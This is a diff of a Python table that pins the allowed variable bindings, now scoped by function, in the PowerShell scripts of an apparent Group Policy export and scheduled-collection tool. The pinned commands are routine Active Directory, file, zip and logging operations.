@@ -46,6 +46,7 @@ Residual limits are stated in ``docs/threat-model.md`` R5.
 
 from __future__ import annotations
 
+import hashlib
 import json
 import os
 import re
@@ -432,7 +433,7 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         "allgpc": frozenset(
             {
                 (
-                    "= Get-ADObject -SearchBase $policiesDN -LDAPFilter "
+                    "[script] = Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                     '"(objectClass=groupPolicyContainer)" ` -Properties displayName '
                     "-ErrorAction Stop"
                 ),
@@ -441,14 +442,14 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # read by a binding of $gpo
         "allgpos": frozenset(
             {
-                "= Get-GPO -All",
+                "[script] = Get-GPO -All",
             }
         ),
-        # receiver of .Add()
+        # receiver of .add()
         "allsids": frozenset(
             {
                 (
-                    "= "
+                    "[script] = "
                     "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                     ":OrdinalIgnoreCase)"
                 ),
@@ -457,47 +458,47 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # read by a binding of $xmlfiles
         "allxmlpath": frozenset(
             {
-                "= Join-Path $out 'AllGPOs.xml'",
+                "[script] = Join-Path $out 'AllGPOs.xml'",
             }
         ),
         # write root
         "archive": frozenset(
             {
-                '= "$ExportPath.zip"',
+                '[new-gpoexportzip] = "$ExportPath.zip"',
             }
         ),
-        # receiver of .Add()
+        # receiver of .add()
         "collectionerrors": frozenset(
             {
-                "= [System.Collections.Generic.List[object]]::new()",
+                "[script] = [System.Collections.Generic.List[object]]::new()",
             }
         ),
         # write root
         "dest": frozenset(
             {
-                "= Join-Path $out 'SYSVOL-Policies'",
+                "[script] = Join-Path $out 'SYSVOL-Policies'",
             }
         ),
         # read by a binding of $f
         "diskfiles": frozenset(
             {
                 (
-                    "= @(Get-ChildItem -LiteralPath $ExportPath -Recurse -File ` -ErrorAction "
-                    "SilentlyContinue -ErrorVariable +zipEnumErr)"
+                    "[new-gpoexportzip] = @(Get-ChildItem -LiteralPath $ExportPath -Recurse "
+                    "-File ` -ErrorAction SilentlyContinue -ErrorVariable +zipEnumErr)"
                 ),
             }
         ),
-        # receiver of .Split()
+        # receiver of .split()
         "dom": frozenset(
             {
-                "= Get-ADDomain",
+                "[script] = Get-ADDomain",
             }
         ),
         # read by a binding of $sid
         "domainsids": frozenset(
             {
                 (
-                    "= @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
+                    "[script] = @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
                     "$principals[$_].type -eq 'Unresolved' })"
                 ),
             }
@@ -505,61 +506,64 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # read by a binding of $diskfiles
         "exportpath": frozenset(
             {
-                "arg $out",
-                "param",
+                "[new-gpoexportzip] arg $out",
+                "[new-gpoexportzip] param",
             }
         ),
-        # receiver of .Replace()
+        # receiver of .replace()
         "f": frozenset(
             {
-                "foreach $diskFiles",
-                "foreach $xmlFiles",
+                "[new-gpoexportzip] foreach $diskFiles",
+                "[script] foreach $xmlFiles",
             }
         ),
-        # receiver of .Add()
+        # receiver of .add()
         "failedsections": frozenset(
             {
-                "= [System.Collections.Generic.List[string]]::new()",
+                "[script] = [System.Collections.Generic.List[string]]::new()",
             }
         ),
-        # receiver of .Trim()
+        # receiver of .trim()
         "gpc": frozenset(
             {
-                "foreach $allGpc",
+                "[script] foreach $allGpc",
             }
         ),
         # write target (Join-Path $out "reports\${safe}__$($gpo.Id).xml")
         "gpo": frozenset(
             {
-                "foreach $allGpos",
+                "[script] foreach $allGpos",
             }
         ),
         # index write $groupMembers[$gSid]
         "groupmembers": frozenset(
             {
-                "= [ordered]@{}",
-                "index $groupMembers[$gSid]",
-                "index $groupMembers['s-1-1-0']",
-                "index $groupMembers['s-1-5-11']",
+                "[script] = [ordered]@{}",
+                "[script] index $groupMembers[$gSid]",
+                "[script] index $groupMembers['s-1-1-0']",
+                "[script] index $groupMembers['s-1-5-11']",
             }
         ),
         # read by a binding of $gsid
         "groupsids": frozenset(
             {
-                "= @($principals.Keys | Where-Object { $principals[$_].type -eq 'Group' })",
+                (
+                    "[script] = @($principals.Keys | Where-Object { $principals[$_].type -eq "
+                    "'Group' })"
+                ),
             }
         ),
         # read by a binding of $groupmembers
         "gsid": frozenset(
             {
-                "foreach $groupSids",
+                "[script] foreach $groupSids",
             }
         ),
-        # receiver of .Add()
+        # receiver of .add()
         "knownids": frozenset(
             {
                 (
-                    "= "
+                    "[script] = "
                     "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                     ":OrdinalIgnoreCase)"
                 ),
@@ -568,32 +572,32 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # write root
         "out": frozenset(
             {
-                '= Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
+                '[script] = Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
             }
         ),
         # write root
         "outputroot": frozenset(
             {
-                'param "C:\\gpo-export"',
+                '[script] param "C:\\gpo-export"',
             }
         ),
-        # receiver of .Trim()
+        # receiver of .trim()
         "pf": frozenset(
             {
-                "foreach $policyFolders",
+                "[script] foreach $policyFolders",
             }
         ),
         # read by a binding of $allgpc
         "policiesdn": frozenset(
             {
-                '= "CN=Policies,CN=System,$($dom.DistinguishedName)"',
+                '[script] = "CN=Policies,CN=System,$($dom.DistinguishedName)"',
             }
         ),
         # read by a binding of $pf
         "policyfolders": frozenset(
             {
                 (
-                    "= @(Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction "
+                    "[script] = @(Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction "
                     "SilentlyContinue -ErrorVariable +srcErr)"
                 ),
             }
@@ -601,67 +605,67 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # index write $principals[$sid]
         "principals": frozenset(
             {
-                "= [ordered]@{}",
-                "index $principals[$sid]",
+                "[script] = [ordered]@{}",
+                "[script] index $principals[$sid]",
             }
         ),
         # write target (Join-Path $out "reports\${safe}__$($gpo.Id).xml")
         "safe": frozenset(
             {
-                "= ($gpo.DisplayName -replace '[\\\\/:*?\"<>|\\[\\]]', '_')",
+                "[script] = ($gpo.DisplayName -replace '[\\\\/:*?\"<>|\\[\\]]', '_')",
             }
         ),
         # read by a binding of $principals
         "sid": frozenset(
             {
-                "foreach $domainSids",
-                "foreach ($allSids | Sort-Object)",
+                "[script] foreach $domainSids",
+                "[script] foreach ($allSids | Sort-Object)",
             }
         ),
-        # receiver of .Translate()
+        # receiver of .translate()
         "sidobj": frozenset(
             {
-                "= New-Object System.Security.Principal.SecurityIdentifier($sid)",
+                "[script] = New-Object System.Security.Principal.SecurityIdentifier($sid)",
             }
         ),
         # read by a binding of $policyfolders
         "src": frozenset(
             {
-                '= "\\\\$($dom.DNSRoot)\\SYSVOL\\$($dom.DNSRoot)\\Policies"',
+                '[script] = "\\\\$($dom.DNSRoot)\\SYSVOL\\$($dom.DNSRoot)\\Policies"',
             }
         ),
         # read by a binding of $out
         "stamp": frozenset(
             {
-                '= Get-Date -Format "yyyyMMdd-HHmmss"',
+                '[script] = Get-Date -Format "yyyyMMdd-HHmmss"',
             }
         ),
-        # receiver of .Add()
+        # receiver of .add()
         "successsections": frozenset(
             {
-                "= [System.Collections.Generic.List[string]]::new()",
+                "[script] = [System.Collections.Generic.List[string]]::new()",
             }
         ),
         # write root
         "testfile": frozenset(
             {
-                '= Join-Path $OutputRoot "_writetest_.tmp"',
+                '[script] = Join-Path $OutputRoot "_writetest_.tmp"',
             }
         ),
         # read by a binding of $f
         "xmlfiles": frozenset(
             {
-                "+= Get-Item -LiteralPath $allXmlPath",
+                "[script] += Get-Item -LiteralPath $allXmlPath",
                 (
-                    "= @(Get-ChildItem -LiteralPath (Join-Path $out 'reports') -Filter '*.xml' "
-                    "-ErrorAction SilentlyContinue)"
+                    "[script] = @(Get-ChildItem -LiteralPath (Join-Path $out 'reports') "
+                    "-Filter '*.xml' -ErrorAction SilentlyContinue)"
                 ),
             }
         ),
-        # receiver of .Dispose()
+        # receiver of .dispose()
         "zip": frozenset(
             {
-                "= [System.IO.Compression.ZipFile]::Open($archive, 'Create')",
+                "[new-gpoexportzip] = [System.IO.Compression.ZipFile]::Open($archive, 'Create')",
             }
         ),
     },
@@ -669,56 +673,56 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # property write $adParams.Credential
         "adparams": frozenset(
             {
-                "= @{}",
-                "member $adParams.Credential",
+                "[script] = @{}",
+                "[script] member $adParams.Credential",
             }
         ),
         # index write $groupMembers[$sid]
         "groupmembers": frozenset(
             {
-                "= [ordered]@{}",
-                'index $groupMembers["s-1-1-0"]',
-                'index $groupMembers["s-1-5-11"]',
-                "index $groupMembers[$sid]",
+                "[script] = [ordered]@{}",
+                '[script] index $groupMembers["s-1-1-0"]',
+                '[script] index $groupMembers["s-1-5-11"]',
+                "[script] index $groupMembers[$sid]",
             }
         ),
         # read by a binding of $grp
         "groups": frozenset(
             {
                 (
-                    "= $principalsData.principals.PSObject.Properties | Where-Object { "
-                    '$_.Value.type -eq "Group" }'
+                    "[script] = $principalsData.principals.PSObject.Properties | Where-Object "
+                    '{ $_.Value.type -eq "Group" }'
                 ),
             }
         ),
         # read by a binding of $sid
         "grp": frozenset(
             {
-                "foreach $groups",
+                "[script] foreach $groups",
             }
         ),
         # write root
         "outputpath": frozenset(
             {
-                'param "group-members.json"',
+                '[script] param "group-members.json"',
             }
         ),
         # read by a binding of $groups
         "principalsdata": frozenset(
             {
-                "= Get-Content $PrincipalsPath -Raw -Encoding UTF8 | ConvertFrom-Json",
+                "[script] = Get-Content $PrincipalsPath -Raw -Encoding UTF8 | ConvertFrom-Json",
             }
         ),
         # read by a binding of $principalsdata
         "principalspath": frozenset(
             {
-                'param "principals.json"',
+                '[script] param "principals.json"',
             }
         ),
         # read by a binding of $groupmembers
         "sid": frozenset(
             {
-                "= $grp.Name",
+                "[script] = $grp.Name",
             }
         ),
     },
@@ -726,15 +730,15 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # property write $adParams.Credential
         "adparams": frozenset(
             {
-                "= @{}",
-                "member $adParams.Credential",
+                "[script] = @{}",
+                "[script] member $adParams.Credential",
             }
         ),
-        # receiver of .Add()
+        # receiver of .add()
         "allsids": frozenset(
             {
                 (
-                    "= "
+                    "[script] = "
                     "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                     ":OrdinalIgnoreCase)"
                 ),
@@ -743,15 +747,15 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # read by a binding of $policiesdn
         "dom": frozenset(
             {
-                "= $null",
-                "= Get-ADDomain @adParams",
+                "[script] = $null",
+                "[script] = Get-ADDomain @adParams",
             }
         ),
         # read by a binding of $sid
         "domainsids": frozenset(
             {
                 (
-                    "= @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
+                    "[script] = @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
                     "$principals[$_].type -eq 'Unresolved' })"
                 ),
             }
@@ -759,14 +763,14 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # read by a binding of $sd
         "gpc": frozenset(
             {
-                "foreach $gpcObjs",
+                "[script] foreach $gpcObjs",
             }
         ),
         # read by a binding of $gpc
         "gpcobjs": frozenset(
             {
                 (
-                    "= Get-ADObject -SearchBase $policiesDN -LDAPFilter "
+                    "[script] = Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                     '"(objectClass=groupPolicyContainer)" -Properties nTSecurityDescriptor, '
                     "displayName @adParams"
                 ),
@@ -775,39 +779,39 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # write root
         "outputpath": frozenset(
             {
-                'param "principals.json"',
+                '[script] param "principals.json"',
             }
         ),
         # read by a binding of $gpcobjs
         "policiesdn": frozenset(
             {
-                '= "CN=Policies,CN=System,$($dom.DistinguishedName)"',
+                '[script] = "CN=Policies,CN=System,$($dom.DistinguishedName)"',
             }
         ),
         # index write $principals[$sid]
         "principals": frozenset(
             {
-                "= [ordered]@{}",
-                "index $principals[$sid]",
+                "[script] = [ordered]@{}",
+                "[script] index $principals[$sid]",
             }
         ),
-        # receiver of .GetSecurityDescriptorSddlForm()
+        # receiver of .getsecuritydescriptorsddlform()
         "sd": frozenset(
             {
-                "= $gpc.nTSecurityDescriptor",
+                "[script] = $gpc.nTSecurityDescriptor",
             }
         ),
         # read by a binding of $principals
         "sid": frozenset(
             {
-                "foreach $allSids | Sort-Object",
-                "foreach $domainSids",
+                "[script] foreach $allSids | Sort-Object",
+                "[script] foreach $domainSids",
             }
         ),
-        # receiver of .Translate()
+        # receiver of .translate()
         "sidobj": frozenset(
             {
-                "= New-Object System.Security.Principal.SecurityIdentifier($sid)",
+                "[script] = New-Object System.Security.Principal.SecurityIdentifier($sid)",
             }
         ),
     },
@@ -815,121 +819,122 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # write root
         "archive": frozenset(
             {
-                "foreach $candidates",
-                "foreach $expired",
+                "[get-gpolenscompletedexports] foreach $candidates",
+                "[invoke-gpolenscollection] foreach $expired",
             }
         ),
-        # parameter of Write-GpoLensOwnerMarkerBytes (pinned in GpoLensCollectionMarker.ps1)
+        # parameter of write-gpolensownermarkerbytes (pinned in GpoLensCollectionMarker.ps1)
         "bytes": frozenset(
             {
-                "= $encoding.GetByteCount($line)",
-                "= Read-GpoLensOwnerMarkerBytes -Marker $marker",
+                "[assert-gpolenscollectionowner] = Read-GpoLensOwnerMarkerBytes -Marker $marker",
+                "[write-gpolenscollectionlog] = $encoding.GetByteCount($line)",
             }
         ),
         # read by a binding of $archive
         "candidates": frozenset(
             {
                 (
-                    "= @(Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' "
-                    "-ErrorAction Stop | Where-Object { $_.BaseName -match "
-                    "'^.+-\\d{8}-\\d{6}$' -and (Test-Path -LiteralPath (Join-Path (Join-Path "
-                    "$OutputRoot $_.BaseName) 'AllGPOs.xml') -PathType Leaf) } | Sort-Object "
-                    "@{ Expression = { $_.BaseName.Substring($_.BaseName.Length - 15) }; "
-                    "Descending = $true }, Name)"
+                    "[get-gpolenscompletedexports] = @(Get-ChildItem -LiteralPath $OutputRoot "
+                    "-File -Filter '*.zip' -ErrorAction Stop | Where-Object { $_.BaseName "
+                    "-match '^.+-\\d{8}-\\d{6}$' -and (Test-Path -LiteralPath (Join-Path "
+                    "(Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml') -PathType Leaf) } | "
+                    "Sort-Object @{ Expression = { $_.BaseName.Substring($_.BaseName.Length - "
+                    "15) }; Descending = $true }, Name)"
                 ),
             }
         ),
         # dynamic invocation & $CollectorPath -OutputRoot $OutputRoot *>&1
         "collectorpath": frozenset(
             {
-                "arg $CollectorPath",
-                "param",
-                "param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
+                "[invoke-gpolenscollection] arg $CollectorPath",
+                "[invoke-gpolenscollection] param",
+                "[script] param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
             }
         ),
         # write root
         "copyto": frozenset(
             {
-                "arg $CopyTo",
-                "param",
+                "[invoke-gpolenscollection] arg $CopyTo",
+                "[invoke-gpolenscollection] param",
+                "[script] param",
             }
         ),
         # read by a binding of $newest
         "created": frozenset(
             {
                 (
-                    "= @(Get-GpoLensCompletedExports -OutputRoot $OutputRoot | Where-Object { "
-                    "-not $previous.ContainsKey($_.FullName) })"
+                    "[invoke-gpolenscollection] = @(Get-GpoLensCompletedExports -OutputRoot "
+                    "$OutputRoot | Where-Object { -not $previous.ContainsKey($_.FullName) })"
                 ),
             }
         ),
         # write root
         "delivery": frozenset(
             {
-                "= Join-Path $CopyTo $newest.Name",
+                "[invoke-gpolenscollection] = Join-Path $CopyTo $newest.Name",
             }
         ),
-        # receiver of .GetByteCount()
+        # receiver of .getbytecount()
         "encoding": frozenset(
             {
-                "= [Text.UTF8Encoding]::new($false)",
+                "[write-gpolenscollectionlog] = [Text.UTF8Encoding]::new($false)",
             }
         ),
-        # receiver of .Delete()
+        # receiver of .delete()
         "entry": frozenset(
             {
-                "= $zip.CreateEntry('gpo-inventory.json')",
-                "= $zip.GetEntry('gpo-inventory.json')",
-                "foreach @($inventory)",
+                "[invoke-gpolenscollection] = $zip.CreateEntry('gpo-inventory.json')",
+                "[invoke-gpolenscollection] = $zip.GetEntry('gpo-inventory.json')",
+                "[invoke-gpolenscollection] foreach @($inventory)",
             }
         ),
         # read by a binding of $archive
         "expired": frozenset(
             {
                 (
-                    "= @(Get-GpoLensCompletedExports -OutputRoot $OutputRoot | Where-Object { "
-                    "[string]::Equals($_.BaseName.Substring(0, $_.BaseName.Length - 16), "
-                    "$producerPrefix, [StringComparison]::Ordinal) } | Select-Object -Skip "
-                    "$Retention)"
+                    "[invoke-gpolenscollection] = @(Get-GpoLensCompletedExports -OutputRoot "
+                    "$OutputRoot | Where-Object { [string]::Equals($_.BaseName.Substring(0, "
+                    "$_.BaseName.Length - 16), $producerPrefix, [StringComparison]::Ordinal) } "
+                    "| Select-Object -Skip $Retention)"
                 ),
             }
         ),
         # write root
         "exportdir": frozenset(
             {
-                "= Join-Path $OutputRoot $newest.BaseName",
+                "[invoke-gpolenscollection] = Join-Path $OutputRoot $newest.BaseName",
             }
         ),
         # read by a binding of $message
         "failure": frozenset(
             {
-                "= $_",
+                "[invoke-gpolenscollection] = $_",
             }
         ),
         # write root
         "folder": frozenset(
             {
-                "= Join-Path $OutputRoot $archive.BaseName",
+                "[invoke-gpolenscollection] = Join-Path $OutputRoot $archive.BaseName",
             }
         ),
         # read by a binding of $next
         "i": frozenset(
             {
-                "= $LogFiles",
-                "incdec PostfixMinusMinus",
+                "[write-gpolenscollectionlog] = $LogFiles",
+                "[write-gpolenscollectionlog] incdec PostfixMinusMinus",
             }
         ),
-        # receiver of .Add()
+        # receiver of .add()
         "ids": frozenset(
             {
-                "= [Collections.Generic.HashSet[guid]]::new()",
+                "[invoke-gpolenscollection] = [Collections.Generic.HashSet[guid]]::new()",
             }
         ),
         # read by a binding of $entry
         "inventory": frozenset(
             {
                 (
-                    "= "
+                    "[invoke-gpolenscollection] = "
                     "[Text.Encoding]::UTF8.GetString($inventoryBytes).TrimStart([char]0xFEFF) "
                     "| ConvertFrom-Json"
                 ),
@@ -939,32 +944,36 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         "inventorybytes": frozenset(
             {
                 (
-                    "= [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath "
-                    "$InventoryPath).ProviderPath)"
+                    "[invoke-gpolenscollection] = [IO.File]::ReadAllBytes((Resolve-Path "
+                    "-LiteralPath $InventoryPath).ProviderPath)"
                 ),
             }
         ),
         # read by a binding of $inventorybytes
         "inventorypath": frozenset(
             {
-                "arg $InventoryPath",
-                "param",
+                "[invoke-gpolenscollection] arg $InventoryPath",
+                "[invoke-gpolenscollection] param",
+                "[script] param",
             }
         ),
-        # receiver of .Substring()
+        # receiver of .substring()
         "line": frozenset(
             {
-                '= "$(Get-Date -Format o) $Message`r`n"',
-                '= $line.Substring(0, $maxChars) + " [truncated]`r`n"',
+                '[write-gpolenscollectionlog] = "$(Get-Date -Format o) $Message`r`n"',
+                (
+                    '[write-gpolenscollectionlog] = $line.Substring(0, $maxChars) + " '
+                    '[truncated]`r`n"'
+                ),
             }
         ),
-        # receiver of .Dispose()
+        # receiver of .dispose()
         "lock": frozenset(
             {
                 (
-                    "= [IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
-                    "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, "
-                    "[IO.FileShare]::None)"
+                    "[invoke-gpolenscollection] = [IO.File]::Open((Join-Path $OutputRoot "
+                    "'collection.lock'), [IO.FileMode]::OpenOrCreate, "
+                    "[IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
                 ),
             }
         ),
@@ -972,188 +981,224 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         "logargs": frozenset(
             {
                 (
-                    "= @{LogPath=(Join-Path $OutputRoot 'collection.log'); "
-                    "LogMaxBytes=$LogMaxBytes; LogFiles=$LogFiles}"
+                    "[invoke-gpolenscollection] = @{LogPath=(Join-Path $OutputRoot "
+                    "'collection.log'); LogMaxBytes=$LogMaxBytes; LogFiles=$LogFiles}"
                 ),
             }
         ),
         # read by a binding of $logargs
         "logfiles": frozenset(
             {
-                "arg $LogFiles",
-                "param",
-                "param 5",
-                "splat @logArgs",
+                "[invoke-gpolenscollection] arg $LogFiles",
+                "[invoke-gpolenscollection] param 5",
+                "[script] param 5",
+                "[write-gpolenscollectionlog] param",
+                "[write-gpolenscollectionlog] splat @logArgs",
             }
         ),
         # read by a binding of $logargs
         "logmaxbytes": frozenset(
             {
-                "arg $LogMaxBytes",
-                "param",
-                "param 5242880",
-                "splat @logArgs",
+                "[invoke-gpolenscollection] arg $LogMaxBytes",
+                "[invoke-gpolenscollection] param 5242880",
+                "[script] param 5242880",
+                "[write-gpolenscollectionlog] param",
+                "[write-gpolenscollectionlog] splat @logArgs",
             }
         ),
         # write root
         "logpath": frozenset(
             {
-                "param",
-                "splat @logArgs",
+                "[write-gpolenscollectionlog] param",
+                "[write-gpolenscollectionlog] splat @logArgs",
             }
         ),
-        # parameter of Read-GpoLensOwnerMarkerBytes (pinned in GpoLensCollectionMarker.ps1)
+        # parameter of read-gpolensownermarkerbytes (pinned in GpoLensCollectionMarker.ps1)
         "marker": frozenset(
             {
-                "= Join-Path $OutputRoot '.gpo-lens-collection-owner'",
-                "arg $marker",
+                (
+                    "[assert-gpolenscollectionowner] = Join-Path $OutputRoot "
+                    "'.gpo-lens-collection-owner'"
+                ),
+                "[read-gpolensownermarkerbytes] arg $marker",
             }
         ),
         # read by a binding of $line
         "maxchars": frozenset(
             {
-                "= [math]::Max(1, [int]($LogMaxBytes / 4) - 40)",
+                "[write-gpolenscollectionlog] = [math]::Max(1, [int]($LogMaxBytes / 4) - 40)",
             }
         ),
         # read by a binding of $line
         "message": frozenset(
             {
-                'arg "Collection failed: $($failure.Exception.Message)"',
                 (
-                    'arg "Collection succeeded: $($newest.Name); retained at most $Retention '
-                    'exports"'
+                    '[write-gpolenscollectionlog] arg "Collection failed: '
+                    '$($failure.Exception.Message)"'
                 ),
-                'arg "ZIP delivered: $delivery"',
-                "arg 'Collection started'",
-                "arg ($_ | Out-String).TrimEnd()",
-                "param",
+                (
+                    '[write-gpolenscollectionlog] arg "Collection succeeded: $($newest.Name); '
+                    'retained at most $Retention exports"'
+                ),
+                '[write-gpolenscollectionlog] arg "ZIP delivered: $delivery"',
+                "[write-gpolenscollectionlog] arg 'Collection started'",
+                "[write-gpolenscollectionlog] arg ($_ | Out-String).TrimEnd()",
+                "[write-gpolenscollectionlog] param",
             }
         ),
         # write root
         "newest": frozenset(
             {
-                "= $created[0]",
+                "[invoke-gpolenscollection] = $created[0]",
             }
         ),
         # write root
         "next": frozenset(
             {
-                '= "$LogPath.$i"',
+                '[write-gpolenscollectionlog] = "$LogPath.$i"',
             }
         ),
         # write root
         "old": frozenset(
             {
-                '= if ($i -eq 1) { $LogPath } else { "$LogPath.$($i - 1)" }',
+                (
+                    "[write-gpolenscollectionlog] = if ($i -eq 1) { $LogPath } else { "
+                    '"$LogPath.$($i - 1)" }'
+                ),
             }
         ),
         # write root
         "outputroot": frozenset(
             {
-                "arg $OutputRoot",
-                "param",
+                "[assert-gpolenscollectionowner] arg $OutputRoot",
+                "[assert-gpolenscollectionowner] param",
+                "[get-gpolenscompletedexports] arg $OutputRoot",
+                "[get-gpolenscompletedexports] param",
+                "[invoke-gpolenscollection] arg $OutputRoot",
+                "[invoke-gpolenscollection] param",
+                "[script] param",
             }
         ),
         # write root
         "partial": frozenset(
             {
-                "= \"$delivery.$([guid]::NewGuid().ToString('N')).partial\"",
+                (
+                    "[invoke-gpolenscollection] = "
+                    "\"$delivery.$([guid]::NewGuid().ToString('N')).partial\""
+                ),
             }
         ),
-        # receiver of .Push()
+        # receiver of .push()
         "pending": frozenset(
             {
-                "= [Collections.Generic.Stack[string]]::new()",
+                "[assert-gpolensregulartree] = [Collections.Generic.Stack[string]]::new()",
             }
         ),
-        # receiver of .ContainsKey()
+        # receiver of .containskey()
         "previous": frozenset(
             {
-                "= @{}",
-                "index $previous[$_.FullName]",
+                "[invoke-gpolenscollection] = @{}",
+                "[invoke-gpolenscollection] index $previous[$_.FullName]",
             }
         ),
         # read by a binding of $expired
         "producerprefix": frozenset(
             {
-                "= $newest.BaseName.Substring(0, $newest.BaseName.Length - 16)",
+                (
+                    "[invoke-gpolenscollection] = $newest.BaseName.Substring(0, "
+                    "$newest.BaseName.Length - 16)"
+                ),
             }
         ),
         # read by a binding of $message
         "retention": frozenset(
             {
-                "arg $Retention",
-                "param 14",
+                "[invoke-gpolenscollection] arg $Retention",
+                "[invoke-gpolenscollection] param 14",
+                "[script] param 14",
             }
         ),
-        # receiver of .Write()
+        # receiver of .write()
         "stream": frozenset(
             {
-                "= $entry.Open()",
+                "[invoke-gpolenscollection] = $entry.Open()",
             }
         ),
-        # receiver of .GetEntry()
+        # receiver of .getentry()
         "zip": frozenset(
             {
-                "= $null",
-                "= [IO.Compression.ZipFile]::Open($newest.FullName, 'Update')",
-                "= [IO.Compression.ZipFile]::OpenRead($archive.FullName)",
+                "[get-gpolenscompletedexports] = $null",
+                (
+                    "[get-gpolenscompletedexports] = "
+                    "[IO.Compression.ZipFile]::OpenRead($archive.FullName)"
+                ),
+                "[invoke-gpolenscollection] = $null",
+                (
+                    "[invoke-gpolenscollection] = "
+                    "[IO.Compression.ZipFile]::Open($newest.FullName, 'Update')"
+                ),
             }
         ),
     },
     "GpoLensCollectionMarker.ps1": {
-        # receiver of .ToArray()
+        # receiver of .toarray()
         "bytes": frozenset(
             {
-                "= [IO.MemoryStream]::new()",
-                "param",
+                "[read-gpolensownermarkerbytes] = [IO.MemoryStream]::new()",
+                "[write-gpolensownermarkerbytes] param",
             }
         ),
         # write root
         "marker": frozenset(
             {
-                "= Join-Path $root.FullName '.gpo-lens-collection-owner'",
-                "param",
+                "[read-gpolensownermarkerbytes] param",
+                (
+                    "[write-gpolensownermarkerbytes] = Join-Path $root.FullName "
+                    "'.gpo-lens-collection-owner'"
+                ),
             }
         ),
         # read by a binding of $root
         "outputroot": frozenset(
             {
-                "param",
+                "[write-gpolensownermarkerbytes] param",
             }
         ),
         # read by a binding of $marker
         "root": frozenset(
             {
-                "= Get-Item -LiteralPath $OutputRoot -Force -ErrorAction Stop",
+                (
+                    "[write-gpolensownermarkerbytes] = Get-Item -LiteralPath $OutputRoot "
+                    "-Force -ErrorAction Stop"
+                ),
             }
         ),
-        # receiver of .ToInt64()
+        # receiver of .toint64()
         "stream": frozenset(
             {
                 (
-                    "= [IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
-                    "[IO.FileShare]::Read)"
+                    "[read-gpolensownermarkerbytes] = [IO.File]::Open($Marker, "
+                    "[IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::Read)"
                 ),
                 (
-                    "= [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
-                    "[IO.FileAccess]::Write, [IO.FileShare]::None)"
+                    "[write-gpolensownermarkerbytes] = [IO.File]::Open($marker, "
+                    "[IO.FileMode]::CreateNew, [IO.FileAccess]::Write, [IO.FileShare]::None)"
                 ),
             }
         ),
     },
     "Register-GpoLensCollection.ps1": {
-        # New-ScheduledTaskPrincipal argument
+        # new-scheduledtaskprincipal argument
         "account": frozenset(
             {
-                "= if ($GmsaAccount) { $GmsaAccount } else { $ServiceAccount }",
+                "[script] = if ($GmsaAccount) { $GmsaAccount } else { $ServiceAccount }",
             }
         ),
-        # New-ScheduledTask argument
+        # new-scheduledtask argument
         "action": frozenset(
             {
                 (
-                    "= New-ScheduledTaskAction -Execute "
+                    "[script] = New-ScheduledTaskAction -Execute "
                     '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ` '
                     "-Argument $taskArgs -WorkingDirectory $PSScriptRoot"
                 ),
@@ -1162,114 +1207,122 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         # read by a binding of $scheduletime
         "at": frozenset(
             {
-                "param '02:00'",
+                "[script] param '02:00'",
             }
         ),
-        # parameter of Write-GpoLensOwnerMarkerBytes (pinned in GpoLensCollectionMarker.ps1)
+        # parameter of write-gpolensownermarkerbytes (pinned in GpoLensCollectionMarker.ps1)
         "bytes": frozenset(
             {
-                "arg $previousBytes",
-                "arg ([Text.UTF8Encoding]::new($false).GetBytes($TaskName))",
+                "[write-gpolensownermarkerbytes] arg $previousBytes",
+                (
+                    "[write-gpolensownermarkerbytes] arg "
+                    "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
+                ),
             }
         ),
         # read by a binding of $taskargs
         "collectorpath": frozenset(
             {
-                "= (Resolve-Path -LiteralPath $CollectorPath).ProviderPath",
-                "param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
+                "[script] = (Resolve-Path -LiteralPath $CollectorPath).ProviderPath",
+                "[script] param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
             }
         ),
         # read by a binding of $taskargs
         "copyto": frozenset(
             {
-                "param",
+                "[script] param",
             }
         ),
-        # receiver of .GetNetworkCredential()
+        # receiver of .getnetworkcredential()
         "credential": frozenset(
             {
-                "= $null",
+                "[script] = $null",
                 (
-                    "= Get-Credential -UserName $ServiceAccount -Message 'Collection task "
-                    "credentials (saved only by Windows Task Scheduler)'"
